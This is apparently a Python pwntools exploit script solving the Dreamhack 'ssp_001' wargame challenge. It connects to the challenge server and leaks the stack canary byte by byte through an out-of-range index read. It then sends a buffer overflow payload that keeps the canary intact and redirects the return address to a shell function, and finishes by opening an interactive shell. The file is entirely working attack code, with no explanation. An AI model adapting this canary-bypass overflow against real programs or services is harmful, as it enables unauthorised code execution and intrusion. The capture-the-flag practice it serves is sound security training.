#!/usr/bin/env python3
from pwn import *

# p = process("./ssp_001")
p = remote("host2.dreamhack.games", 8634)
shell_addr = 0x080486b9
def canary_leak():
    canary = b""
    for i in [0x80, 0x81, 0x82, 0x83]:
        p.recvuntil(">")
        p.sendline("P")
        p.recvuntil("index : ")
        p.sendline(str(i))
        p.recvuntil("is : ")
        canary += int(p.recvline().strip(),16).to_bytes(1, "little")
    return canary


canary = canary_leak()

payload = b"\x90" * 0x40
payload += canary
payload += b"\x90" * 8
payload += p32(shell_addr)

p.sendline("E")
p.recvuntil("Size : ")
p.sendline(str(len(payload)))
p.recvuntil("Name : ")
p.sendline(payload)
p.interactive()